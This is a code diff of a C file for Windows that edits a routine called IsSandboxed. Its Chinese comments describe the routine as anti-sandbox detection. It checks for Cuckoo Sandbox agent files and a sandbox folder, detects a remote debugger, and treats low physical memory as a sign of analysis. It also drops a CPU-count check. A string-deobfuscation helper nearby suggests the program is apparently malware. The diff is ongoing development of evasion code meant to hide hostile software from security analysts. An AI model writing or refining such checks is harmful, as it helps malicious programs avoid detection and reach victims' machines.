@@ -98,22 +98,19 @@ static void DeobfW(WCHAR *s) {
 
 /** @brief 反沙箱检测 — 检查是否在虚拟化/分析环境中运行 */
 static BOOL IsSandboxed(void) {
-    /* 检查典型沙箱特征 */
+    /* 检查典型沙箱特征文件 */
     if (GetFileAttributesW(L"C:\\agent\\agent.pyw") != INVALID_FILE_ATTRIBUTES)
         return TRUE;  /* Cuckoo Sandbox */
-    if (GetProcAddress(GetModuleHandleW(L"kernel32"), "CheckRemoteDebuggerPresent")) {
-        BOOL debugged = FALSE;
-        CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
-        if (debugged) return TRUE;
-    }
-    /* 检查物理内存是否过小（沙箱通常 <= 2GB） */
+    if (GetFileAttributesW(L"C:\\sandbox") != INVALID_FILE_ATTRIBUTES)
+        return TRUE;  /* 通用沙箱标志 */
+    /* 调试器检测 */
+    BOOL debugged = FALSE;
+    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
+    if (debugged) return TRUE;
+    /* 物理内存 < 512MB → 极大概率是沙箱/虚拟机 */
     MEMORYSTATUSEX ms = { sizeof(ms) };
-    if (GlobalMemoryStatusEx(&ms) && ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024)
+    if (GlobalMemoryStatusEx(&ms) && ms.ullTotalPhys < 512ULL * 1024 * 1024)
         return TRUE;
-    /* 检查 CPU 核心数（沙箱通常 <= 2） */
-    SYSTEM_INFO si;
-    GetSystemInfo(&si);
-    if (si.dwNumberOfProcessors <= 1) return TRUE;
     return FALSE;
 }
 
